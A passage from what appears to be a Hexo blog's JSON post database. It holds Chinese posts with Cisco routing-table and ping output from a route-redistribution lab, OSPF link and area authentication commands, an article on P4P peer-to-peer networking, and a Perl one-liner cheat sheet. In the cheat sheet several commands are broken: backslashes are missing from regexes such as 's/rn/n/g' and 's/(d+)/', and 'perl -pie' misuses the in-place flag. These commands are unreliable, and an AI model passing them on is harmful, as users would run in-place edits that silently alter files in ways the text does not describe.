[120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br /><br />R2：<br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />R&amp;#160;&amp;#160;&amp;#160; 1.0.0.0&#x2F;8 [120&#x2F;1] via 192.168.1.1, 00:00:15, FastEthernet0&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br />O E2 192.168.4.0&#x2F;24 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br />O E2 192.168.3.0&#x2F;24 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br /><br />R3:<br /><br /><br />R3#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />O E2 1.0.0.0&#x2F;8 [110&#x2F;20] via 192.168.2.1, 00:21:47, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />D EX&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [170&#x2F;2588160] via 192.168.3.2, 00:32:31, Ethernet1&#x2F;1<br />D&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 [90&#x2F;307200] via 192.168.3.2, 00:32:31, Ethernet1&#x2F;1<br />O E2 192.168.1.0&#x2F;24 [110&#x2F;20] via 192.168.2.1, 00:21:47, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br /><br /><br />R4:<br /><br />R4#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />D EX 1.0.0.0&#x2F;8 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [1&#x2F;0] via 192.168.4.2<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br />D EX 192.168.1.0&#x2F;24 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />D EX 192.168.2.0&#x2F;24 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br /><br /><br />R5:<br /><br />R5#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [1&#x2F;0] via 192.168.4.1<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 is directly connected, Lo<br>opback0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br /><br /><br /><br /><br />测试结果：<br /><br /><br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;36&#x2F;64 ms<br />R1#ping 192.168.2.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.2.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;20&#x2F;32 ms<br />R1#ping 192.168.3.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.3.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;32&#x2F;60 ms<br />R1#ping 192.168.4.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.4.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 4&#x2F;38&#x2F;64 ms<br /><br />成功！！！！<br /><br /><br /><br /></p>\n"},{"title":"OSPF路由验证","date":"2010-03-30T06:37:00.000Z","_content":"OSPF路由验证：<br />主要分为两大方面<br />1.基于链路的验证<br />2..基于区域的验证<br />这里就只发命令了，很简单。<br />1.基于链路的验证：<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf authentication //接口S0/0启用简单口令认证<br />R1(config-if)#ip ospf authentication-key cisco //配置认证密码<br />或者<br /><br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf authentication message-digest//接口s0/0 启用MD5 认证<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco //配置key ID 及密匙<br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />2.基于区域的验证<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 192.168.12.0 255.255.255.0 area 0<br />R1(config-router)#network 1.1.1.0 255.255.255.0 area 0<br />R1(config-router)#area 0 authentication message-digest&#160; / /区域号0 启用MD5 认证<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco&#160;&#160; //接口配置认证key ID 及密匙 ID 1 钥匙cisco<br />或者<br />R1(config-if)#ip ospf authentication-key cisco&#160; //接口配置认证key为cisco 明文 <br /><br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />验证优先级：OSPF 链路认证优于区域认证","source":"_posts/OSPF路由验证.md","raw":"title: OSPF路由验证\ncategories: [网络工程]\ntags: []\ndate: 2010-03-30 14:37:00\n---\nOSPF路由验证：<br />主要分为两大方面<br />1.基于链路的验证<br />2..基于区域的验证<br />这里就只发命令了，很简单。<br />1.基于链路的验证：<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf authentication //接口S0/0启用简单口令认证<br />R1(config-if)#ip ospf authentication-key cisco //配置认证密码<br />或者<br /><br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf authentication message-digest//接口s0/0 启用MD5 认证<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco //配置key ID 及密匙<br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />2.基于区域的验证<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 192.168.12.0 255.255.255.0 area 0<br />R1(config-router)#network 1.1.1.0 255.255.255.0 area 0<br />R1(config-router)#area 0 authentication message-digest&#160; / /区域号0 启用MD5 认证<br />R1(config)#interface s0/0<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco&#160;&#160; //接口配置认证key ID 及密匙 ID 1 钥匙cisco<br />或者<br />R1(config-if)#ip ospf authentication-key cisco&#160; //接口配置认证key为cisco 明文 <br /><br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />验证优先级：OSPF 链路认证优于区域认证","slug":"OSPF路由验证","published":1,"updated":"2023-04-22T05:38:44.681Z","_id":"clgrjlxio005n7opi38q4017t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>OSPF路由验证：<br />主要分为两大方面<br />1.基于链路的验证<br />2..基于区域的验证<br />这里就只发命令了，很简单。<br />1.基于链路的验证：<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf authentication &#x2F;&#x2F;接口S0&#x2F;0启用简单口令认证<br />R1(config-if)#ip ospf authentication-key cisco &#x2F;&#x2F;配置认证密码<br />或者<br /><br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf authentication message-digest&#x2F;&#x2F;接口s0&#x2F;0 启用MD5 认证<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco &#x2F;&#x2F;配置key ID 及密匙<br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />2.基于区域的验证<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 192.168.12.0 255.255.255.0 area 0<br />R1(config-router)#network 1.1.1.0 255.255.255.0 area 0<br />R1(config-router)#area 0 authentication message-digest&amp;#160; &#x2F; &#x2F;区域号0 启用MD5 认证<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco&amp;#160;&amp;#160; &#x2F;&#x2F;接口配置认证key ID 及密匙 ID 1 钥匙cisco<br />或者<br />R1(config-if)#ip ospf authentication-key cisco&amp;#160; &#x2F;&#x2F;接口配置认证key为cisco 明文 <br /><br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />验证优先级：OSPF 链路认证优于区域认证</p>\n","site":{"data":{}},"excerpt":"","more":"<p>OSPF路由验证：<br />主要分为两大方面<br />1.基于链路的验证<br />2..基于区域的验证<br />这里就只发命令了，很简单。<br />1.基于链路的验证：<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf authentication &#x2F;&#x2F;接口S0&#x2F;0启用简单口令认证<br />R1(config-if)#ip ospf authentication-key cisco &#x2F;&#x2F;配置认证密码<br />或者<br /><br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 1.1.1.0 0.0.0.255 area 0<br />R1(config-router)#network 192.168.12.0 0.0.0.255 area 0<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf authentication message-digest&#x2F;&#x2F;接口s0&#x2F;0 启用MD5 认证<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco &#x2F;&#x2F;配置key ID 及密匙<br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />2.基于区域的验证<br />R1(config)#router ospf 1<br />R1(config-router)#router-id 1.1.1.1<br />R1(config-router)#network 192.168.12.0 255.255.255.0 area 0<br />R1(config-router)#network 1.1.1.0 255.255.255.0 area 0<br />R1(config-router)#area 0 authentication message-digest&amp;#160; &#x2F; &#x2F;区域号0 启用MD5 认证<br />R1(config)#interface s0&#x2F;0<br />R1(config-if)#ip ospf message-digest-key 1 md5 cisco&amp;#160;&amp;#160; &#x2F;&#x2F;接口配置认证key ID 及密匙 ID 1 钥匙cisco<br />或者<br />R1(config-if)#ip ospf authentication-key cisco&amp;#160; &#x2F;&#x2F;接口配置认证key为cisco 明文 <br /><br />注意：加密方式，应该一样。不然无法建立关系。<br /><br />验证优先级：OSPF 链路认证优于区域认证</p>\n"},{"title":"P4P技术","date":"2010-03-26T10:32:00.000Z","_content":"<a target=\"_blank\" href=\"http://baike.baidu.com/image/7787b9ef14740309fdfa3cb4\" rel=\"noopener noreferrer\"><br /></a>P4P 全称“Proactive network Provider Participation for P2P”，  是P2P技术的升级版，而不是广告商所谓的p4p，p4p技术意在加强服务供应商(ISP)与客户端程序的通信，降低骨干网络传输压力和运营成本，并提高改良的P2P文件传输的性能。与P2P 随机挑选 Peer(对等机)不同，P4P协议可以协调网络拓扑数据，能够有效选择Peer，从而提高网络路由效率。<br />7月30日消息：德国一个名为iPoque的研究机构在2007年研究了一百多万网民将近3TB的匿名数据流量，调查地区包括澳大利亚、东欧、德国、中东 和南欧地区。调查发现，目前网络带宽“消费大户”是P2P文件共享，在中东占据了49%，东欧地区占据了84%。从全球来看，晚上时段的网络带宽有95% 被P2P占据。据国内权威部门统计，当前P2P流量已经占整个互联网流量的约70%，并且正在以每年350%的速度增长。P2P流量消耗了巨大的网络带 宽，尤其是国际带宽，使网络基础设施不堪重负，运营商苦不堪言。<br />问题的症结不在于P2P，而在于交换的机制。P2P过于强调“对等”，每个节点之间的交换完全是无序的。一个北京的用户，既可能和广州的用户进行文件片段 的交换，也可能和远在美国的某用户进行交换。显然，无序的交换导致了无谓的跨地区甚至是跨国的“流量旅行”，这耗费了宝贵的国内和国际带宽资源，代价巨 大。<br />值得一提的是，P4P的开山鼻祖是一位工作在耶鲁大学的中国人，谢海勇博士。谢博士系美国分布式计算工业联盟 (DCIA)和P4P工作组的首席研究员，提出并完成了P4P理论和系统设计。自今年2月底以来，谢海永等研究人员对P4P系统设计进行了大规模现场测 试。 <br />这项中国人主导的发明，在商业测试中有出色表现。根据Verizon工程师的反馈，使用P4P技 术，P2P用户平均下载速度提高60%，光纤到户用户提高205%~665  %。此外，运营商内部数据传送距离减少了84%。用户有58%的数据是来自同城，较传统P2P的6.3%比例有了近10倍提升。<br />P4P协议可以协调网络拓扑数据，能够有效选择节点，从而提高网络路由效率。仍以上述例子来说，北京的用户就可以优先和北京同城的用户来实现文件片段的交 换，再扩展至较远的地区，有十分的必要时，才会出国进行文件片段交换。当然，P4P的运行机制，要远远超过“同城交换”的概念，它还会根据用户的上行、下 载带宽进行综合判断，以进行最有效选择，最大化整体交换的效率。","source":"_posts/P4P技术.md","raw":"title: P4P技术\ncategories: [网络工程]\ntags: []\ndate: 2010-03-26 18:32:00\n---\n<a target=\"_blank\" href=\"http://baike.baidu.com/image/7787b9ef14740309fdfa3cb4\" rel=\"noopener noreferrer\"><br /></a>P4P 全称“Proactive network Provider Participation for P2P”，  是P2P技术的升级版，而不是广告商所谓的p4p，p4p技术意在加强服务供应商(ISP)与客户端程序的通信，降低骨干网络传输压力和运营成本，并提高改良的P2P文件传输的性能。与P2P 随机挑选 Peer(对等机)不同，P4P协议可以协调网络拓扑数据，能够有效选择Peer，从而提高网络路由效率。<br />7月30日消息：德国一个名为iPoque的研究机构在2007年研究了一百多万网民将近3TB的匿名数据流量，调查地区包括澳大利亚、东欧、德国、中东 和南欧地区。调查发现，目前网络带宽“消费大户”是P2P文件共享，在中东占据了49%，东欧地区占据了84%。从全球来看，晚上时段的网络带宽有95% 被P2P占据。据国内权威部门统计，当前P2P流量已经占整个互联网流量的约70%，并且正在以每年350%的速度增长。P2P流量消耗了巨大的网络带 宽，尤其是国际带宽，使网络基础设施不堪重负，运营商苦不堪言。<br />问题的症结不在于P2P，而在于交换的机制。P2P过于强调“对等”，每个节点之间的交换完全是无序的。一个北京的用户，既可能和广州的用户进行文件片段 的交换，也可能和远在美国的某用户进行交换。显然，无序的交换导致了无谓的跨地区甚至是跨国的“流量旅行”，这耗费了宝贵的国内和国际带宽资源，代价巨 大。<br />值得一提的是，P4P的开山鼻祖是一位工作在耶鲁大学的中国人，谢海勇博士。谢博士系美国分布式计算工业联盟 (DCIA)和P4P工作组的首席研究员，提出并完成了P4P理论和系统设计。自今年2月底以来，谢海永等研究人员对P4P系统设计进行了大规模现场测 试。 <br />这项中国人主导的发明，在商业测试中有出色表现。根据Verizon工程师的反馈，使用P4P技 术，P2P用户平均下载速度提高60%，光纤到户用户提高205%~665  %。此外，运营商内部数据传送距离减少了84%。用户有58%的数据是来自同城，较传统P2P的6.3%比例有了近10倍提升。<br />P4P协议可以协调网络拓扑数据，能够有效选择节点，从而提高网络路由效率。仍以上述例子来说，北京的用户就可以优先和北京同城的用户来实现文件片段的交 换，再扩展至较远的地区，有十分的必要时，才会出国进行文件片段交换。当然，P4P的运行机制，要远远超过“同城交换”的概念，它还会根据用户的上行、下 载带宽进行综合判断，以进行最有效选择，最大化整体交换的效率。","slug":"P4P技术","published":1,"updated":"2023-04-22T05:38:44.683Z","_id":"clgrjlxip005p7opihum1bgwc","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a target=\"_blank\" href=\"http://baike.baidu.com/image/7787b9ef14740309fdfa3cb4\" rel=\"noopener noreferrer\"><br /></a>P4P 全称“Proactive network Provider Participation for P2P”，  是P2P技术的升级版，而不是广告商所谓的p4p，p4p技术意在加强服务供应商(ISP)与客户端程序的通信，降低骨干网络传输压力和运营成本，并提高改良的P2P文件传输的性能。与P2P 随机挑选 Peer(对等机)不同，P4P协议可以协调网络拓扑数据，能够有效选择Peer，从而提高网络路由效率。<br />7月30日消息：德国一个名为iPoque的研究机构在2007年研究了一百多万网民将近3TB的匿名数据流量，调查地区包括澳大利亚、东欧、德国、中东 和南欧地区。调查发现，目前网络带宽“消费大户”是P2P文件共享，在中东占据了49%，东欧地区占据了84%。从全球来看，晚上时段的网络带宽有95% 被P2P占据。据国内权威部门统计，当前P2P流量已经占整个互联网流量的约70%，并且正在以每年350%的速度增长。P2P流量消耗了巨大的网络带 宽，尤其是国际带宽，使网络基础设施不堪重负，运营商苦不堪言。<br />问题的症结不在于P2P，而在于交换的机制。P2P过于强调“对等”，每个节点之间的交换完全是无序的。一个北京的用户，既可能和广州的用户进行文件片段 的交换，也可能和远在美国的某用户进行交换。显然，无序的交换导致了无谓的跨地区甚至是跨国的“流量旅行”，这耗费了宝贵的国内和国际带宽资源，代价巨 大。<br />值得一提的是，P4P的开山鼻祖是一位工作在耶鲁大学的中国人，谢海勇博士。谢博士系美国分布式计算工业联盟 (DCIA)和P4P工作组的首席研究员，提出并完成了P4P理论和系统设计。自今年2月底以来，谢海永等研究人员对P4P系统设计进行了大规模现场测 试。 <br />这项中国人主导的发明，在商业测试中有出色表现。根据Verizon工程师的反馈，使用P4P技 术，P2P用户平均下载速度提高60%，光纤到户用户提高205%~665  %。此外，运营商内部数据传送距离减少了84%。用户有58%的数据是来自同城，较传统P2P的6.3%比例有了近10倍提升。<br />P4P协议可以协调网络拓扑数据，能够有效选择节点，从而提高网络路由效率。仍以上述例子来说，北京的用户就可以优先和北京同城的用户来实现文件片段的交 换，再扩展至较远的地区，有十分的必要时，才会出国进行文件片段交换。当然，P4P的运行机制，要远远超过“同城交换”的概念，它还会根据用户的上行、下 载带宽进行综合判断，以进行最有效选择，最大化整体交换的效率。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a target=\"_blank\" href=\"http://baike.baidu.com/image/7787b9ef14740309fdfa3cb4\" rel=\"noopener noreferrer\"><br /></a>P4P 全称“Proactive network Provider Participation for P2P”，  是P2P技术的升级版，而不是广告商所谓的p4p，p4p技术意在加强服务供应商(ISP)与客户端程序的通信，降低骨干网络传输压力和运营成本，并提高改良的P2P文件传输的性能。与P2P 随机挑选 Peer(对等机)不同，P4P协议可以协调网络拓扑数据，能够有效选择Peer，从而提高网络路由效率。<br />7月30日消息：德国一个名为iPoque的研究机构在2007年研究了一百多万网民将近3TB的匿名数据流量，调查地区包括澳大利亚、东欧、德国、中东 和南欧地区。调查发现，目前网络带宽“消费大户”是P2P文件共享，在中东占据了49%，东欧地区占据了84%。从全球来看，晚上时段的网络带宽有95% 被P2P占据。据国内权威部门统计，当前P2P流量已经占整个互联网流量的约70%，并且正在以每年350%的速度增长。P2P流量消耗了巨大的网络带 宽，尤其是国际带宽，使网络基础设施不堪重负，运营商苦不堪言。<br />问题的症结不在于P2P，而在于交换的机制。P2P过于强调“对等”，每个节点之间的交换完全是无序的。一个北京的用户，既可能和广州的用户进行文件片段 的交换，也可能和远在美国的某用户进行交换。显然，无序的交换导致了无谓的跨地区甚至是跨国的“流量旅行”，这耗费了宝贵的国内和国际带宽资源，代价巨 大。<br />值得一提的是，P4P的开山鼻祖是一位工作在耶鲁大学的中国人，谢海勇博士。谢博士系美国分布式计算工业联盟 (DCIA)和P4P工作组的首席研究员，提出并完成了P4P理论和系统设计。自今年2月底以来，谢海永等研究人员对P4P系统设计进行了大规模现场测 试。 <br />这项中国人主导的发明，在商业测试中有出色表现。根据Verizon工程师的反馈，使用P4P技 术，P2P用户平均下载速度提高60%，光纤到户用户提高205%~665  %。此外，运营商内部数据传送距离减少了84%。用户有58%的数据是来自同城，较传统P2P的6.3%比例有了近10倍提升。<br />P4P协议可以协调网络拓扑数据，能够有效选择节点，从而提高网络路由效率。仍以上述例子来说，北京的用户就可以优先和北京同城的用户来实现文件片段的交 换，再扩展至较远的地区，有十分的必要时，才会出国进行文件片段交换。当然，P4P的运行机制，要远远超过“同城交换”的概念，它还会根据用户的上行、下 载带宽进行综合判断，以进行最有效选择，最大化整体交换的效率。</p>\n"},{"title":"perl 命令行常用语法","date":"2014-03-22T07:35:26.000Z","_content":"替换\n将所有C程序中的foo替换成bar，旧文件备份成.bak\nperl -p -i.bak -e 's/bfoob/bar/g' *.c\n很强大的功能，特别是在大程序中做重构。记得只有在UltraEdit用过。 如果你不想备份，就直接写成 perl -p -i -e 或者更简单 perl -pie， 恩，pie这个单词不错\n将每个文件中出现的数值都加一\nperl -i.bak -pe 's/(d+)/ 1 + $1 /ge' file1 file2 ....\n将换行符rn替换成n\nperl -pie 's/rn/n/g' file\n同dos2unix命令。\n将换行符n替换成rn\nperl -pie 's/n/rn/g' file\n同unix2dos命令。\n取出文件的一部分\n显示字段0-4和字段6，字段的分隔符是空格\nperl -lane 'print \"@F[0..4] $F[6]\"' file\n很好很强大，同 awk 'print $1, $2, $3, $4, $5, $7'。参数名称lane也很好记。\n如果字段分隔符不是空格而是冒号，则用\nperl -F: -lane 'print \"@F[0..4]n\"' /etc/passwd\n显示START和END之间的部分\nperl -ne 'print if /^START$/ .. /^END$/' file\n恐怕这个操作只有sed才做得到了吧……\n相反，不显示START和END之间的部分\nperl -ne 'print unless /^START$/ .. /^END$/' file\n显示开头50行：\nperl -pe 'exit if $. > 50' file\n同命令 head -n 50\n不显示开头10行：\nperl -ne 'print unless 1 .. 10' file\n显示15行到17行：\nperl -ne 'print if 15 .. 17' file\n每行取前80个字符：\nperl -lne 'print substr($_, 0, 80) = \"\"' file\n每行丢弃前10个字符：\nperl -lne 'print substr($_, 10) = \"\"' file\n搜索\n查找comment字符串：\nperl -ne 'print if /comment/' duptext\n这个就是普通的grep命令了。\n查找不含comment字符串的行：\nperl -ne 'print unless /comment/' duptext\n反向的grep，即grep -v。\n查找包含comment或apple的行：\nperl -ne 'print if /comment/ || /apple/' duptext\n相同的功能就要用到egrep了，语法比较复杂，我不会……\n计算\n计算字段4和倒数第二字段之和：\nperl -lane 'print $F[4] + $F[-2]'\n要是用awk，就得写成 awk '{i=NF-1;print $5+$i}'\n排序和反转\n文件按行排序：\nperl -e 'print sort &lt;>' file\n相当于简单的sort命令。\n文件按段落排序：\nperl -00 -e 'print sort &lt;>' file\n多个文件按文件内容排序，并返回合并后的文件：\nperl -0777 -e 'print sort &lt;>' file1 file2\n文件按行反转：\nperl -e 'print reverse &lt;>' file1\n相应的命令有吗？有……不过挺偏，tac（cat的反转）\n数值计算\n10进制转16进制：\nperl  -ne  'printf \"%xn\",$_'\n10进制转8进制： perl -ne 'printf \"%on\",$_'\n16进制转10进制：\nperl -ne 'print  hex($_).\"n\"'\n8进制转10进制：\nperl -ne 'print  oct($_).\"n\"'\n简易计算器。\nperl -ne 'print  eval($_).\"n\"'\n其他\n启动交互式perl：\nperl -de 1\n查看包含路径的内容：\nperl -le 'print for @INC'\n备注\n与One-Liner相关的Perl命令行参数：\n-0&lt;数字>\n(用8进制表示)指定记录分隔符($/变量)，默认为换行\n-00\n段落模式，即以连续换行为分隔符\n-0777\n禁用分隔符，即将整个文件作为一个记录\n-a\n自动分隔模式，用空格分隔$_并保存到@F中。相当于@F = split ''。分隔符可以使用-F参数指定\n-F\n指定-a的分隔符，可以使用正则表达式\n-e\n执行指定的脚本。\n-i&lt;扩展名>\n原地替换文件，并将旧文件用指定的扩展名备份。不指定扩展名则不备份。\n-l\n对输入内容自动chomp，对输出内容自动添加换行\n-n\n自动循环，相当于 while(&lt;>) { 脚本; }\n-p\n自动循环+自动输出，相当于 while(&lt;>) { 脚本; print; }","source":"_posts/perl-命令行常用语法.md","raw":"title: perl 命令行常用语法\ncategories: [Perl编程]\ntags: []\ndate: 2014-03-22 15:35:26\n---\n替换\n将所有C程序中的foo替换成bar，旧文件备份成.bak\nperl -p -i.bak -e 's/bfoob/bar/g' *.c\n很强大的功能，特别是在大程序中做重构。记得只有在UltraEdit用过。 如果你不想备份，就直接写成 perl -p -i -e 或者更简单 perl -pie， 恩，pie这个单词不错\n将每个文件中出现的数值都加一\nperl -i.bak -pe 's/(d+)/ 1 + $1 /ge' file1 file2 ....\n将换行符rn替换成n\nperl -pie 's/rn/n/g' file\n同dos2unix命令。\n将换行符n替换成rn\nperl -pie 's/n/rn/g' file\n同unix2dos命令。\n取出文件的一部分\n显示字段0-4和字段6，字段的分隔符是空格\nperl -lane 'print \"@F[0..4] $F[6]\"' file\n很好很强大，同 awk 'print $1, $2, $3, $4, $5, $7'。参数名称lane也很好记。\n如果字段分隔符不是空格而是冒号，则用\nperl -F: -lane 'print \"@F[0..4]n\"' /etc/passwd\n显示START和END之间的部分\nperl -ne 'print if /^START$/ .. /^END$/' file\n恐怕这个操作只有sed才做得到了吧……\n相反，不显示START和END之间的部分\nperl -ne 'print unless /^START$/ .. /^END$/' file\n显示开头50行：\nperl -pe 'exit if $. > 50' file\n同命令 head -n 50\n不显示开头10行：\nperl -ne 'print unless 1 .. 10' file\n显示15行到17行：\nperl -ne 'print if 15 .. 17' file\n每行取前80个字符：\nperl -lne 'print substr($_, 0, 80) = \"\"' file\n每行丢弃前10个字符：\nperl -lne 'print substr($_, 10) = \"\"' file\n搜索\n查找comment字符串：\nperl -ne 'print if /comment/' duptext\n这个就是普通的grep命令了。\n查找不含comment字符串的行：\nperl -ne 'print unless /comment/' duptext\n反向的grep，即grep -v。\n查找包含comment或apple的行：\nperl -ne 'print if /comment/ || /apple/' duptext\n相同的功能就要用到egrep了，语法比较复杂，我不会……\n计算\n计算字段4和倒数第二字段之和：\nperl -lane 'print $F[4] + $F[-2]'\n要是用awk，就得写成 awk '{i=NF-1;print $5+$i}'\n排序和反转\n文件按行排序：\nperl -e 'print sort &lt;>' file\n相当于简单的sort命令。\n文件按段落排序：\nperl -00 -e 'print sort &lt;>' file\n多个文件按文件内容排序，并返回合并后的文件：\nperl -0777 -e 'print sort &lt;>' file1 file2\n文件按行反转：\nperl -e 'print reverse &lt;>' 